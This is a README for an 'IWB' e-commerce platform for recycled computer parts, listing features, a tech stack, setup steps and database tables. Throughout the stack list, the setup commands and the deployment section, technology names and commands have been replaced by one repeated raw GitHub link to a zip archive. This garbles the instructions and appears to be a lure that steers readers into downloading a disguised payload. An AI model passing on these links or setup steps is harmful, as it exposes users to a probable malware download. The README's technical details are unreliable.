# IWB E-Commerce Platform

A modern, responsive e-commerce platform for IWB (Innovative Waste Business) focused on recycling computer parts with Instagram-inspired UI.

## Features

- **Authentication System**: Secure login and registration
- **Dashboard**: Complete analytics with sales tracking and financial reports
- **Product Management**: Add, edit, and manage recycled computer parts inventory
- **Services Management**: Manage recycling and repair services
- **Customer Queries**: Automated response system with NLP for customer inquiries
- **Sales Tracking**: Complete sales management system
- **Financial Reporting**: Income statements and financial trends
- **Responsive Design**: Mobile-first approach with Instagram-inspired UI

## Tech Stack

- **Frontend**: React (TypeScript), Tailwind CSS
- **Backend**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip, Express
- **Database**: PostgreSQL on AWS RDS
- **ORM**: Drizzle ORM
- **Authentication**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip
- **State Management**: TanStack Query
- **Natural Language Processing**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip for automated responses

## Setup Instructions

1. Clone the repository
   ```
   git clone https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip
   cd iwb-ecommerce
   ```

2. Install dependencies
   ```
   npm install
   ```

3. Create environment variables
   ```
   cp https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip .env
   ```
   Then edit the `.env` file with your database credentials and other settings

4. Run database migrations
   ```
   npm run db:push
   ```

5. Seed the database (optional)
   ```
   npm run db:seed
   ```

6. Start the development server
   ```
   npm run dev
   ```

7. Open your browser and navigate to `http://localhost:5000`

## Deployment

The application is configured to be deployed to AWS or any platform supporting https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip applications.

## Database Schema

The application uses PostgreSQL with the following main tables:
- Users (Authentication)
- Products (Recycled components inventory)
- Services (Recycling and repair services)
- Sales (Customer purchases)
- Queries (Customer inquiries with automated responses)
- Income Statements (Financial reporting)

## License

MIT
